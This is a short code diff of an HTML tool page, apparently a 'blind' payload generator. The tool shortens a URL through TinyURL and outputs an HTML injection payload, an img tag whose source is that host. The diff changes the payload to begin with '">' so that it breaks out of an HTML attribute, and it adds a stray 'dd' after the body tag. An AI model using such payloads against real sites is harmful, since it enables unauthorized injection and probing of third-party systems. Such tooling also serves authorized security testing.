@@ -22,7 +22,7 @@
     }
   </style>
 </head>
-<body>
+<body>dd
   <h2>URL to Blindf Format Converter + TinyURL Payload</h2>
 
   <label for="urlInput">Enter URL:</label>
@@ -59,7 +59,7 @@
 
           // Remove protocol for payload
           const withoutProtocol = shortUrl.replace(/^https?:\/\//, '');
-          const payload = `<img/src=//${withoutProtocol}>`;
+          const payload = `"><img/src=//${withoutProtocol}>`;
           document.getElementById("payloadOutput").value = payload;
         })
         .catch(error => {
